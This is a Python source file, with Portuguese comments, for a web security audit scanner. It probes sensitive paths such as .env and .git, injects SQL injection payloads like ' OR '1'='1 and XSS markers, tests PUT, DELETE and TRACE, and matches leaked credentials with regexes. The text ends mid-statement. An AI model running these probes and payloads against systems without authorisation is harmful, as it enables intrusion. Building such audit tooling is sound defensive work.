#!/usr/bin/env python3
from __future__ import annotations

import argparse
import asyncio
import logging
import os
import re
import secrets
import socket
import ssl
import time
import warnings
from collections.abc import Mapping
from dataclasses import asdict, dataclass, field
from html.parser import HTMLParser
from urllib.parse import parse_qs, urljoin, urlparse

import httpx

from utils import (
    Cyber,
    FetchError,
    RateLimiter,
    __version__,
    add_common_args,
    apply_session_auth,
    color,
    create_async_client,
    create_banner,
    detect_spa_fallback,
    ensure_output_dir,
    extract_hostname,
    fetch,
    header_get,
    init_scanner,
    normalize_url,
    read_target_lines,
    resolve_target_urls,
    run_main_loop,
    safe_asyncio_run,
    severity_color,
    status_color,
    write_output,
)

logger = logging.getLogger("mytools.attackaudit")

"""Ferramenta de auditoria web para alvos autorizados, combinando red team e hardening defensivo.

Fluxo principal (run_once):
  1. Coleta basica: HTTP GET -> headers, body, TLS info
  2. Path probing: testa paths sensíveis (.env, .git, admin, etc.)
  3. Analise HTML: forms, scripts externos, CSRF, comentarios
  4. TLS: subject/issuer do certificado + versoes suportadas
  5. Metodos HTTP: testa PUT/DELETE/PATCH/TRACE em endpoints
  6. Vulnerabilidades: XSS reflection + SQLi error-based (paralelo)
  7. Scoring: calcula risk_score baseado nos findings

Cada finding tem severidade (critical/high/medium/low/info) e categoria.
O risk_score e a soma dos RISK_WEIGHTS por severidade.
"""

SECURITY_HEADERS_RECS = {
    "strict-transport-security": "Ative HSTS com max-age alto e includeSubDomains quando fizer sentido.",
    "content-security-policy": "Defina CSP para reduzir XSS e carregamento de recursos nao confiaveis.",
    "x-frame-options": "Use DENY/SAMEORIGIN ou frame-ancestors via CSP contra clickjacking.",
    "x-content-type-options": "Use nosniff para impedir MIME sniffing.",
    "referrer-policy": "Use politica restritiva, como strict-origin-when-cross-origin.",
    "permissions-policy": "Desabilite APIs do browser que a aplicacao nao usa.",
}

INTERESTING_PATHS = (
    ".env", ".git/HEAD", "backup.zip", "backup.tar.gz", "dump.sql", "db.sql",
    "config.php", "phpinfo.php", "server-status", "actuator", "actuator/env",
    "swagger.json", "swagger-ui/", "api-docs", "openapi.json", "robots.txt",
    "sitemap.xml", "admin", "login", "wp-admin", "phpmyadmin",
)

METHODS_TO_TEST = ["PUT", "DELETE", "PATCH", "TRACE", "OPTIONS", "HEAD"]

RISK_WEIGHTS = {
    "critical": 10,
    "high": 7,
    "medium": 4,
    "low": 1,
    "info": 0,
}

SQL_ERROR_PATTERNS: dict[str, list[re.Pattern[str]]] = {
    "mysql": [
        re.compile(r"You have an error in your SQL syntax", re.IGNORECASE),
        re.compile(r"Warning.*mysql_", re.IGNORECASE),
        re.compile(r"MySqlException", re.IGNORECASE),
        re.compile(r"valid MySQL result", re.IGNORECASE),
        re.compile(r"check the manual that corresponds to your MySQL", re.IGNORECASE),
        re.compile(r"MySqlClient\.", re.IGNORECASE),
        re.compile(r"com\.mysql\.jdbc", re.IGNORECASE),
    ],
    "postgresql": [
        re.compile(r"PostgreSQL.*ERROR", re.IGNORECASE),
        re.compile(r"Warning.*\Wpg_", re.IGNORECASE),
        re.compile(r"valid PostgreSQL result", re.IGNORECASE),
        re.compile(r"Npgsql\.", re.IGNORECASE),
        re.compile(r"PG::SyntaxError", re.IGNORECASE),
        re.compile(r"org\.postgresql\.util\.PSQLException", re.IGNORECASE),
        re.compile(r"ERROR:\s+syntax error at or near", re.IGNORECASE),
    ],
    "mssql": [
        re.compile(r"Driver.* SQL[\-\_\ ]*Server", re.IGNORECASE),
        re.compile(r"OLE DB.* SQL Server", re.IGNORECASE),
        re.compile(r"(\W|\A)SQL Server[^a-zA-Z0-9]", re.IGNORECASE),
        re.compile(r"ODBC SQL Server Driver", re.IGNORECASE),
        re.compile(r"SQLJDBC", re.IGNORECASE),
        re.compile(r"com\.microsoft\.sqlserver\.jdbc", re.IGNORECASE),
        re.compile(r"Unclosed quotation mark after the character string", re.IGNORECASE),
    ],
    "oracle": [
        re.compile(r"(\W|\A)ORA-[0-9][0-9][0-9][0-9]", re.IGNORECASE),
        re.compile(r"Oracle error", re.IGNORECASE),
        re.compile(r"Oracle.*Driver", re.IGNORECASE),
        re.compile(r"Warning.*\Woci_", re.IGNORECASE),
        re.compile(r"Warning.*\Wora_", re.IGNORECASE),
    ],
    "sqlite": [
        re.compile(r"SQLite/JDBCDriver", re.IGNORECASE),
        re.compile(r"SQLite\.Exception", re.IGNORECASE),
        re.compile(r"System\.Data\.SQLite\.SQLiteException", re.IGNORECASE),
        re.compile(r"Warning.*sqlite_", re.IGNORECASE),
        re.compile(r"Warning.*SQLite3::", re.IGNORECASE),
        re.compile(r"(\W|\A)SQLITE_ERROR", re.IGNORECASE),
        re.compile(r"SQLite error", re.IGNORECASE),
    ],
}

SQLI_PAYLOADS = ("'", "\"", "`", "' OR '1'='1", "\" OR \"1\"=\"1")

CSRF_FIELD_NAMES_LOWER = frozenset({
    "csrf_token", "_csrf", "csrf", "csrftoken", "_token",
    "authenticity_token", "xsrf-token", "_xsrf", "_csrf_token", "csrfmiddlewaretoken", "__requestverificationtoken",
})

DEFAULT_INJECT_PARAMS = ("q", "id", "search", "page", "name", "user", "cmd", "file", "path", "input")

_SENSITIVE_HIDDEN_FIELDS: dict[str, tuple[str, str, list[re.Pattern[str]]]] = {
    "credential_field": ("critical", "exposure", [
        re.compile(r"(?:password|passwd|pwd|pass)\b", re.IGNORECASE),
    ]),
    "api_key_field": ("high", "exposure", [
        re.compile(r"(?:api[_-]?key|apikey|secret[_-]?key|access[_-]?key)\b", re.IGNORECASE),
    ]),
    "token_field": ("high", "exposure", [
        re.compile(r"(?:auth[_-]?token|bearer|jwt|session[_-]?token|access[_-]?token)\b", re.IGNORECASE),
    ]),
    "private_key_field": ("critical", "exposure", [
        re.compile(r"(?:private[_-]?key|ssh[_-]?key|pgp)\b", re.IGNORECASE),
    ]),
    "internal_id_field": ("low", "info_leak", [
        re.compile(r"(?:user[_-]?id|customer[_-]?id|account[_-]?id|employee[_-]?id)\b", re.IGNORECASE),
    ]),
}

_SENSITIVE_VALUE_PATTERNS: dict[str, tuple[str, str, re.Pattern[str]]] = {
    "jwt_token": ("high", "exposure",
        re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}")),
    "aws_access_key": ("critical", "exposure",
        re.compile(r"(?:AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}")),
    "hardcoded_password": ("high", "exposure",
        re.compile(r"^(?:admin|password|123456|secret|changeme|root)$", re.IGNORECASE)),
    "base64_token": ("medium", "exposure",
        re.compile(r"^[A-Za-z0-9+/]{40,}={0,2}$")),
    "hex_token": ("medium", "exposure",
        re.compile(r"^[0-9a-f]{32,}$", re.IGNORECASE)),
    "private_key_block": ("critical", "exposure",
        re.compile(r"-----BEGIN\s+(?:RSA|DSA|EC)?\s*PRIVATE\s+KEY-----")),
}

ERROR_INFO_PATTERNS: dict[str, list[re.Pattern[str]]] = {
    "stack_trace": [
        re.compile(r"at\s+[\w.]+\([\w.]+\.java:\d+\)"),
        re.compile(r"at\s+[\w.]+\s+in\s+.*\.cs:line\s+\d+"),
        re.compile(r"(?:Fatal error|Uncaught.*Exception).*in\s+.*\.php\s+on\s+line\s+\d+"),
        re.compile(r"Traceback \(most recent call last\):"),
        re.compile(r"(?:ActionController|ActiveRecord)::\w+Error"),
        re.compile(r"at\s+\w+\.\w+\s+\(.*\.js:\d+:\d+\)"),
    ],
    "framework_version": [
        re.compile(r"Apache/\d+\.\d+\.\d+"),
        re.compile(r"nginx/\d+\.\d+\.\d+"),
        re.compile(r"Microsoft-IIS/\d+\.\d+"),
        re.compile(r"Apache-Coyote/\d+\.\d+"),
        re.compile(r"PHP/\d+\.\d+\.\d+"),
        re.compile(r"X-Powered-By:\s*\w+/\d+"),
        re.compile(r"Django/\d+\.\d+"),
        re.compile(r"Laravel\s+v\d+"),
        re.compile(r"Spring/\d+\.\d+"),
    ],
    "internal_path": [
        re.compile(r"(?:/var/www/|/home/\w+/|/app/|/src/|C:\\\\(?:inetpub|Users))"),
        re.compile(r"(?:/etc/(?:passwd|shadow|apache2|nginx))"),
        re.compile(r"(?:\.env|\.git|\.svn|\.DS_Store)"),
        re.compile(r"(?:/proc/self/|/proc/version)"),
    ],
    "database_error": [
        re.compile(r"(?:MySQL|PostgreSQL|SQLite|Oracle|SQL Server).*(?:error|exception|warning)", re.IGNORECASE),
        re.compile(r"(?:database\s+(?:error|connection|configuration)\s+error)", re.IGNORECASE),
        re.compile(r"(?:ECONNREFUSED|ETIMEDOUT|ENOTFOUND).*(?:database|redis|mongo)", re.IGNORECASE),
    ],
    "config_leak": [
        re.compile(r"(?:AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY)\s*="),
        re.compile(r"(?:API_KEY|SECRET_KEY|PRIVATE_KEY)\s*[:=]"),
        re.compile(r"(?:jdbc:|mongodb://|redis://|amqp://)"),
        re.compile(r"(?:BEGIN\s+(?:RSA|DSA|EC)?\s*PRIVATE\s+KEY)"),
    ],
}

_ERROR_INFO_SEVERITY: dict[str, str] = {
    "stack_trace": "high",
    "framework_version": "medium",
    "internal_path": "high",
    "database_error": "medium",
    "config_leak": "critical",
}

_ERROR_INFO_RECOMMENDATIONS: dict[str, str] = {
    "stack_trace": "Configure error pages customizadas para nao expor stack traces em producao.",
    "framework_version": "Remova versao de frameworks de headers e error pages.",
    "internal_path": "Restrinja acesso a arquivos sensiveis e configure webroot corretamente.",
    "database_error": "Trate erros de banco de forma generica, sem expor detalhes ao cliente.",
    "config_leak": "Nunca exponha credenciais ou chaves em respostas HTTP.",
}

_WAF_SIGNATURES: dict[str, dict[str, str | list[tuple[str, str]]]] = {
    "cloudflare": {
        "headers": [("cf-ray", ".+"), ("cf-cache-status", ".+"), ("server", "cloudflare")],
    },
    "akamai": {
        "headers": [("server", "AkamaiGHost")],
    },
    "aws_cloudfront": {
        "headers": [("via", "cloudfront"), ("x-amz-cf-id", ".+")],
    },
    "aws_waf": {
        "headers": [("server", "awselb|awselb/2.0")],
    },
    "incapsula": {
        "headers": [("x-iinfo", ".+")],
        "cookies": [("incap_ses", ".+"), ("visid_incap", ".+")],
    },
    "sucuri": {
        "headers": [("x-sucuri-id", ".+"), ("server", "Sucuri")],
    },
    "f5_bigip": {
        "headers": [("bigip", ".+"), ("bip", ".+")],
    },
    "barracuda": {
        "headers": [("x-barracuda", ".+")],
    },
}

_VERBOSE_ERROR_HEADERS: dict[str, tuple[str, str, str]] = {
    "x-debug": ("medium", "info_leak", "Desabilite headers de debug em producao."),
    "x-debug-token": ("medium", "info_leak", "Desabilite headers de debug em producao."),
    "x-debug-token-link": ("medium", "info_leak", "Desabilite headers de debug em producao."),
    "x-debug-toolbar": ("high", "info_leak", "Toolbar de debug exposta — remova em producao."),
    "x-debugger": ("medium", "info_leak", "Debugger ativo — desabilite em producao."),
    "x-trace": ("medium", "info_leak", "Trace header ativo — desabilite em producao."),
    "x-aspnet-version": ("low", "fingerprint", "Remova versao ASP.NET dos headers."),
    "x-aspnetmvc-version": ("low", "fingerprint", "Remova versao ASP.NET MVC dos headers."),
    "x-powered-by": ("low", "fingerprint", "Remova o header para reduzir fingerprinting."),
    "x-generator": ("low", "fingerprint", "Remova header X-Generator para reduzir fingerprinting."),
}


def _extract_query_params(url: str) -> list[str]:
    """Extrai nomes dos query params de uma URL para injecao XSS/SQLi."""
    parsed = urlparse(url)
    if not parsed.query:
        return []
    return list(parse_qs(parsed.query, keep_blank_values=True).keys())


def analyze_error_response(body: str) -> list[Finding]:
    """Analisa corpo de resposta HTTP em busca de info leakage.

    Procura por stack traces, versoes de framework, paths internos,
    erros de banco e vazamento de configuracao. Retorna um Finding
    por categoria encontrada (max 1 match por categoria).
    """
    findings: list[Finding] = []
    for category, patterns in ERROR_INFO_PATTERNS.items():
        for pattern in patterns:
            match = pattern.search(body)
            if match:
                start = max(0, match.start() - 50)
                end = min(len(body), match.end() + 50)
                snippet = body[start:end].strip()
                findings.append(Finding(
                    _ERROR_INFO_SEVERITY[category],
                    "info_leak",
                    f"{category} detectado",
                    snippet[:200],
                    _ERROR_INFO_RECOMMENDATIONS[category],
                ))
                break
    return findings


def analyze_headers_findings(
    headers: Mapping[str, str],
    raw_headers: dict[str, list[str]] | None = None,
) -> list[Finding]:
    """Analisa headers HTTP em busca de WAF/CDN e headers verbose/debug.

    Detecta signatures de WAF via headers e cookies, e identifica headers
    que vazam informacoes de debug ou versao. Retorna uma lista de Findings.
    """
    findings: list[Finding] = []
    lower_headers = {k.lower(): v for k, v in headers.items()}

    for waf_name, waf_rules in _WAF_SIGNATURES.items():
        header_rules: list[tuple[str, str]] = waf_rules.get("headers", [])  # type: ignore[assignment]
        matched = False
        for hdr, pattern in header_rules:
            if re.search(pattern, lower_headers.get(hdr, ""), re.IGNORECASE):
                matched = True
                break
        if not matched:
            cookie_rules: list[tuple[str, str]] = waf_rules.get("cookies", [])  # type: ignore[assignment]
            all_cookies = " ".join(
                (raw_headers or {}).get("set-cookie", [])
            )
            for cookie_name, cookie_pat in cookie_rules:
                if re.search(cookie_name, all_cookies, re.IGNORECASE) and re.search(cookie_pat, all_cookies):
                    matched = True
                    break
        if matched:
            findings.append(Finding(
                "info", "waf", f"WAF/CDN detectado: {waf_name}",
                f"WAF {waf_name} detectado via headers/cookies.",
                "Considere o impacto no escaneamento e ajuste payloads conforme necessario.",
                "",
            ))

    for header_name, (severity, category, recommendation) in _VERBOSE_ERROR_HEADERS.items():
        if header_name in lower_headers:
            value = lower_headers[header_name]
            findings.append(Finding(
                severity, category, f"Header verbose/exposto: {header_name}",
                f"{header_name}: {value[:120]}",
                recommendation,
                f"curl -I {{url}} 2>/dev/null | grep -i '{header_name}'",
            ))

    return findings


def analyze_hidden_fields(hidden_fields: list[tuple[str, str]]) -> list[Finding]:
    """Analisa campos hidden em forms buscando dados sensiveis.

    Verifica nomes de campos contra padroes de credenciais/tokens e
    valores contra padroes de dados sensiveis (JWT, AWS keys, etc).
    Retorna no max 1 Finding por nome de campo sensivel.
    """
    findings: list[Finding] = []
    seen_fields: set[str] = set()

    for name, value in hidden_fields:
        name_lower = name.lower()

        for field_type, (severity, category, patterns) in _SENSITIVE_HIDDEN_FIELDS.items():
            if field_type in seen_fields:
                continue
            for pattern in patterns:
                if pattern.search(name_lower):
                    findings.append(Finding(
                        severity, category,
                        f"Campo hidden sensivel: {name_lower}",
                        f"Hidden field '{name}' pode conter dados sensiveis.",
                        "Nao armazene credenciais ou dados sensiveis em campos hidden.",
                        f"# Verifique o valor via DevTools (Elements > <input type=\"hidden\">)\n"
                        f"grep -r '{name}' .",
                    ))
                    seen_fields.add(field_type)
                    break

        if value:
            for value_type, (severity, category, pattern) in _SENSITIVE_VALUE_PATTERNS.items():
                if pattern.search(value):
                    findings.append(Finding(
                        severity, category,
                        f"Valor sensiveis em hidden field '{name}'",
                        f"Valor em hidden field contem {value_type.replace('_', ' ')}.",
                        "Nunca exponha tokens, keys ou credenciais em campos hidden.",
                        f"# Valor detectado comecando por: {value[:20]}...",
                    ))
                    break

    return findings


class PageParser(HTMLParser):
    """Analisa HTML para extrair forms, scripts externos, comentarios e titulo.

    Coleta sinais de seguranca:
    - Quantidade de forms (indica superficie de ataque)
    - Inputs type=password (indica areas de autenticacao)
    - Scripts externos (possivel vetor de XSS via CDN comprometido)
    - Tokens CSRF em forms hidden (protecao contra CSRF)
    - Comentarios HTML (podem vazar info sensivel)
    - Titulo da pagina (util para fingerprinting)
    """

    def __init__(self) -> None:
        super().__init__()
        self.forms = 0
        self.password_inputs = 0
        self.external_scripts: set[str] = set()
        self.comments: list[str] = []
        self._title = False
        self.title_parts: list[str] = []
        self.form_has_csrf: list[bool] = []
        self._current_form_has_csrf = False
        self.hidden_fields: list[tuple[str, str]] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        attrs_dict = {key.lower(): value or "" for key, value in attrs}
        if tag.lower() == "title":
            self._title = True
        if tag.lower() == "form":
            self.forms += 1
            self._current_form_has_csrf = False
        if tag.lower() == "input":
            input_type = attrs_dict.get("type", "").lower()
            input_name = attrs_dict.get("name", "").lower()
            if input_type == "password":
                self.password_inputs += 1
            if input_type == "hidden":
                hidden_name = attrs_dict.get("name", "")
                hidden_value = attrs_dict.get("value", "")
                self.hidden_fields.append((hidden_name, hidden_value))
                if input_name in CSRF_FIELD_NAMES_LOWER:
                    self._current_form_has_csrf = True
        if tag.lower() == "script" and attrs_dict.get("src"):
            self.external_scripts.add(attrs_dict["src"])

    def handle_endtag(self, tag: str) -> None:
        if tag.lower() == "title":
            self._title = False
        if tag.lower() == "form":
            self.form_has_csrf.append(self._current_form_has_csrf)

    def handle_data(self, data: str) -> None:
        if self._title:
            self.title_parts.append(data.strip())

    def handle_comment(self, data: str) -> None:
        text = " ".join(data.split())
        if text:
            self.comments.append(text[:120])

    @property
    def title(self) -> str:
        return " ".join(part for part in self.title_parts if part)[:100]

    @property
    def forms_missing_csrf(self) -> int:
        """Retorna numero de formulários POST sem token CSRF."""
        if not self.form_has_csrf:
            return 0
        return sum(1 for has_csrf in self.form_has_csrf if not has_csrf)


@dataclass(frozen=True, slots=True)
class Probe:
    """Resultado de probing de um path na aplicacao."""

    url: str
    status: int
    size: int
    location: str


@dataclass(frozen=True, slots=True)
class Finding:
    """Finding de seguranca identificado durante a auditoria."""

    severity: str
    category: str
    item: str
    evidence: str
    recommendation: str
    exploit: str = ""


@dataclass(frozen=True, slots=True)
class TLSVersionResult:
    """Resultado de teste de versao TLS."""

    protocol: str
    supported: bool
    reason: str = ""


@dataclass(frozen=True, slots=True)
class MethodResult:
    """Resultado de teste de metodo HTTP em um endpoint."""

    url: str
    method: str
    status: int
    size: int


@dataclass(frozen=True, slots=True)
class AuditResult:
    """Resultado completo de uma auditoria web."""

    target: str
    final_url: str
    status: int
    title: str
    ip: str
    tls_subject: str
    tls_issuer: str
    tls_not_after: str
    allowed_methods: list[str]
    forms: int
    password_inputs: int
    probes: list[Probe]
    findings: list[Finding]
    risk_score: int
    elapsed: float
    tls_versions: list[TLSVersionResult] = field(default_factory=list)
    xss_reflected: bool = False
    sqli_errors: list[str] = field(default_factory=list)
    csrf_missing: int = 0
    method_results: list[MethodResult] = field(default_factory=list)


banner = create_banner(r"""
    ___   __  __             __      ___             ___ __
   /   | / /_/ /_____ ______/ /__   /   | __  ______/ (_) /_
  / /| |/ __/ __/ __ `/ ___/ //_/  / /| |/ / / / __  / / __/
 / ___ / /_/ /_/ /_/ / /__/ ,<    / ___ / /_/ / /_/ / / /_
/_/  |_\__/\__/\__,_/\___/_/|_|  /_/  |_\__,_/\__,_/_/\__/
""", "   red/blue web audit | ofensivo autorizado + hardening defensivo")


def load_paths_from_file(paths_file: str) -> list[str]:
    """Carrega paths customizados de arquivo (um por linha)."""
    paths = read_target_lines(paths_file, sort_dedup=True)
    if not paths:
        raise ValueError(f"nenhum path valido em {paths_file}")
    return paths


def _resolve_ip_sync(hostname: str) -> str:
    """Resolve hostname para endereco IP (sincrono, para usar com asyncio.to_thread)."""
    try:
        return socket.gethostbyname(hostname)
    except OSError:
        return ""


async def resolve_ip(hostname: str) -> str:
    """Resolve hostname para endereco IP de forma assincrona."""
    return await asyncio.to_thread(_resolve_ip_sync, hostname)


def _tls_info_sync(url: str, timeout: float) -> tuple[str, str, str]:
    """Coleta subject, issuer e data de expiracao do certificado TLS (sincrono)."""
    parsed = urlparse(url)
    if parsed.scheme != "https":
        return "", "", ""
    port = parsed.port or 443
    context = ssl.create_default_context()
    try:
        with socket.create_connection((parsed.hostname or "", port), timeout=timeout) as sock:  # noqa: SIM117
            with context.wrap_socket(sock, server_hostname=parsed.hostname) as tls:
                cert = tls.getpeercert()
    except (OSError, ssl.SSLError, TimeoutError):
        return "", "", ""

    if cert is None:
        return "", "", ""

    def flatten_name(rows: object) -> str:
        parts = []
        if isinstance(rows, tuple):
            for row in rows:
                if isinstance(row, tuple):
                    for key, value in row:
                        if key in {"commonName", "organizationName"}:
                            parts.append(value)
        return ", ".join(parts)

    subject = cert.get("subject", ())
    issuer = cert.get("issuer", ())
    not_after = cert.get("notAfter", "")
    return (
        flatten_name(subject),  # pyright: ignore[reportArgumentType]
        flatten_name(issuer),  # pyright: ignore[reportArgumentType]
        not_after if isinstance(not_after, str) else "",
    )


async def tls_info(url: str, timeout: float) -> tuple[str, str, str]:
    """Coleta subject, issuer e data de expiracao do certificado TLS (assincrono)."""
    return await asyncio.to_thread(_tls_info_sync, url, timeout)


def _check_tls_versions_sync(url: str, timeout: float) -> list[TLSVersionResult]:
    """Testa suporte a versoes TLS/SSL (sincrono, para usar com asyncio.to_thread).

    Para cada versao, cria um novo SSLContext com minimum/maximum fixados
    na versao alvo. Se a conexao TLS for bem-sucedida, a versao e suportada.
    SSLv3 e TLS 1.0/1.1 podem nao existir em Pythons recentes (removidos por
    motivos de seguranca), entao verificamos com hasattr() antes de usar.
    """
    parsed = urlparse(url)
    if parsed.scheme != "https":
        return []
    hostname = parsed.hostname or ""
    port = parsed.port or 443
    results: list[TLSVersionResult] = []

    version_configs = [
        ("SSLv3", ssl.TLSVersion.SSLv3 if hasattr(ssl.TLSVersion, 'SSLv3') else None),
        ("TLS 1.0", ssl.TLSVersion.TLSv1 if hasattr(ssl.TLSVersion, 'TLSv1') else None),
        ("TLS 1.1", ssl.TLSVersion.TLSv1_1 if hasattr(ssl.TLSVersion, 'TLSv1_1') else None),
        ("TLS 1.2", ssl.TLSVersion.TLSv1_2),
        ("TLS 1.3", ssl.TLSVersion.TLSv1_3),
    ]

    for protocol_name, tls_version in version_configs:
        if tls_version is None:
            results.append(TLSVersionResult(protocol=protocol_name, supported=False, reason="nao disponivel no Python"))
            continue
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with warnings.catch_warnings():
                warnings.filterwarnings("ignore", category=DeprecationWarning)
                ctx.minimum_version = tls_version
                ctx.maximum_version = tls_version
                with socket.create_connection((hostname, port), timeout=timeout) as sock:  # noqa: SIM117
                    with ctx.wrap_socket(sock, server_hostname=hostname) as tls_sock:
                        _ = tls_sock.version()
            results.append(TLSVersionResult(protocol=protocol_name, supported=True))
        except (ssl.SSLError, OSError, TimeoutError) as e:
            results.append(TLSVersionResult(protocol=protocol_name, supported=False, reason=str(e)[:80]))

    return results


async def check_tls_versions(url: str, timeout: float) -> list[TLSVersionResult]:
    """Testa suporte a versoes TLS/SSL de forma assincrona."""
    return await asyncio.to_thread(_check_tls_versions_sync, url, timeout)


async def check_xss_reflection(
    client: httpx.AsyncClient,
    base_url: str,
    timeout: float,
    inject_params: list[str] | None = None,
) -> tuple[bool, str]:
    """Testa se a URL reflete entrada sem sanitizacao basica de XSS.

    Estrategia: gera um marker unico (ex: "xss7f3a1b2c"), injeta em cada
    parametro da URL, e verifica se o marker aparece no corpo da resposta.
    Se aparecer, a aplicacao reflete entrada do usuario sem sanitizacao,
    indicando potencial vulnerabilidade a XSS refletido.

    Retorna (True, evidencia) no primeiro hit, ou (False, "") se nenhum
    parametro refletir. Para paralelizar entre URLs, usar asyncio.gather
    na chamada externa.
    """
    if inject_params is None:
        url_params = _extract_query_params(base_url)
        inject_params = url_params if url_params else list(DEFAULT_INJECT_PARAMS)

    for param in inject_params:
        marker = "xss" + secrets.token_hex(4)
        parsed = urlparse(base_url)
        if parsed.query and param + "=" in parsed.query:
            test_url = re.sub(rf'{re.escape(param)}=[^&]*', param + "=" + marker, base_url, count=1)
        else:
            separator = "&" if "?" in base_url else "?"
            test_url = base_url + separator + param + "=" + marker

        try:
            _, _headers, body, _ = await fetch(client, test_url, timeout=timeout)
        except FetchError:
            continue

        text = body.decode("utf-8", errors="replace")
        if marker in text:
            lower_text = text.lower()
            marker_lower = marker.lower()
            context = "html_body"
            idx = lower_text.find(marker_lower)
            snippet = text[max(0, idx - 30):idx + len(marker) + 30]
            return True, f"refletido em {context} via param={param}: ...{snippet}..."
    return False, ""


async def check_sqli_errors(
    client: httpx.AsyncClient,
    base_url: str,
    timeout: float,
    inject_params: list[str] | None = None,
) -> list[str]:
    """Testa se a aplicacao retorna erros SQL em payloads de injecao.

    Estrategia: injeta payloads classicos de SQLi (aspas, OR 1=1) em cada
    parametro e analisa a resposta em busca de mensagens de erro SQL
    (MySQL, PostgreSQL, MSSQL, Oracle, SQLite). Cada banco tem padroes
    de erro proprios definidos em SQL_ERROR_PATTERNS.

    Executa todos os pares (param, payload) em paralelo via asyncio.gather
    com Semaphore(5) para limitar concorrencia.
    """
    parsed = urlparse(base_url)

    if inject_params is None:
        url_params = _extract_query_params(base_url)
        inject_params = url_params if url_params else ["id"]

    sem = asyncio.Semaphore(5)

    async def _test_one(param: str, payload: str) -> list[str]:
        async with sem:
            if parsed.query:
                test_url = re.sub(rf'{re.escape(param)}=[^&]*', param + "=" + payload, base_url, count=1)
            else:
                test_url = base_url + "?" + param + "=" + payload

            try:
                _, _, body, _ = await fetch(client, test_url, timeout=timeout)
            except FetchError:
                return []

            text = body.decode("utf-8", errors="replace")
            found: list[str] = []
            for db_name, patterns in SQL_ERROR_PATTERNS.items():
                for pattern in patterns:
                    if pattern.search(text):
                        found.append(db_name)
                        break
            return found

    tasks = [
        _test_one(param, payload)
        for param in inject_params
        for payload in SQLI_PAYLOADS[:2]
    ]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    detected_databases: list[str] = []
    for result in results:
        if isinstance(result, BaseException):
            continue
        for db_name in result:
            if db_name not in detected_databases:
                detected_databases.append(db_name)

    return detected_databases


async def parse_allowed_methods(client: httpx.AsyncClient, url: str, timeout: float) -> list[str]:
    """Obtem metodos HTTP permitidos via requisicao OPTIONS."""
    try:
        _, headers, _, _ = await fetch(client, url, timeout=timeout, method="OPTIONS")
    except FetchError:
        return []
    allow = header_get(headers, "allow") or header_get(headers, "access-control-allow-methods")
    return sorted({item.strip().upper() for item in allow.split(",") if item.strip()})


async def probe_path(client: httpx.AsyncClient, rate_limiter: RateLimiter, base_url: str, path: str, timeout: float) -> Probe | None:
    """Faz probing de um path especifico, retornando Probe se acessivel."""
    url = urljoin(base_url.rstrip("/") + "/", path)
    await rate_limiter.wait()
    try:
        status, headers, body, _ = await fetch(client, url, timeout=timeout, rate_limiter=rate_limiter)
    except FetchError:
        return None
    if status in {200, 204, 301, 302, 307, 308, 401, 403}:
        return Probe(url, status, len(body), header_get(headers, "location"))
    return None


async def scan_paths(
    client: httpx.AsyncClient,
    rate_limiter: RateLimiter,
    base_url: str,
    timeout: float,
    concurrency: int,
    paths: list[str] | None = None,
) -> list[Probe]:
    """Escaneia paths interessantes em paralelo usando asyncio.gather.

    Inclui deteccao de SPA: se >80% dos probes retornam mesmo (status, size),
    sao tratados como fallback do SPA e filtrados para evitar falsos positivos.
    """
    target_paths = paths if paths is not None else INTERESTING_PATHS
    sem = asyncio.Semaphore(concurrency)

    async def _limited_probe(path: str) -> Probe | None:
        async with sem:
            return await probe_path(client, rate_limiter, base_url, path, timeout)

    tasks = [_limited_probe(path) for path in target_paths]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    all_probes: list[Probe] = []
    for result in results:
        if isinstance(result, BaseException):
            continue
        if result:
            all_probes.append(result)
            print(
                f"{color('[+]', Cyber.GREEN, Cyber.BOLD)} "
                f"{color(str(result.status).ljust(3), status_color(result.status), Cyber.BOLD)} "
                f"{color(str(result.size).rjust(7), Cyber.YELLOW)}B "
                f"{color(result.url, Cyber.CYAN)}"
            )

    # SPA detection: se >80% dos probes tem mesmo (status, size),
    # provavelmente e o SPA retornando shell HTML para todos os paths.
    probes = all_probes
    spa_skip_indices = detect_spa_fallback(all_probes, lambda p: (p.status, p.size), min_count=5)
    if spa_skip_indices:
        spa_urls = {all_probes[i].url for i in spa_skip_indices}
        probes = [p for p in all_probes if p.url not in spa_urls]
        first_idx = next(iter(spa_skip_indices))
        logger.debug("SPA detectado: %d/%d probes ignorados", len(spa_urls), len(all_probes))
        if probes:
            dk = (all_probes[first_idx].status, all_probes[first_idx].size)
            print(color("[*]", Cyber.YELLOW, Cyber.BOLD),
                  f"SPA detectado: filtrados {color(str(len(spa_urls)), Cyber.RED)} "
                  f"probes de fallback ({dk[0]} {dk[1]}B)")

    return sorted(probes, key=lambda item: (item.status, item.url))


async def test_http_methods(
    client: httpx.AsyncClient,
    probes: list[Probe],
    timeout: float,
    rate_limiter: RateLimiter,
    methods: list[str] | None = None,
) -> list[MethodResult]:
    """Testa metodos HTTP perigosos nos endpoints descobertos."""
    to_test = methods or METHODS_TO_TEST
    seen: set[tuple[str, str]] = set()
    pairs: list[tuple[str, str]] = []

    for probe in probes:
        if probe.status not in {200, 401, 403}:
            continue
        for method in to_test:
            key = (probe.url, method)
            if key in seen:
                continue
            seen.add(key)
            pairs.append((probe.url, method))

    sem = asyncio.Semaphore(5)

    async def _test_one(url: str, method: str) -> MethodResult | None:
        async with sem:
            await rate_limiter.wait()
            try:
                status, _, body, _ = await fetch(client, url, timeout=timeout, method=method, rate_limiter=rate_limiter)
            except FetchError:
                return None
            if status not in {0, 404, 405} and method in {"PUT", "DELETE", "PATCH", "TRACE"}:
                return MethodResult(url, method, status, len(body))
            return None

    tasks = [_test_one(url, method) for url, method in pairs]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    method_results: list[MethodResult] = []
    for result in results:
        if isinstance(result, BaseException) or result is None:
            continue
        method_results.append(result)
        if result.status in {200, 201, 204}:
            print(
                f"  {color('[+]', Cyber.GREEN, Cyber.BOLD)} "
                f"{color(result.method.ljust(7), Cyber.YELLOW, Cyber.BOLD)} "
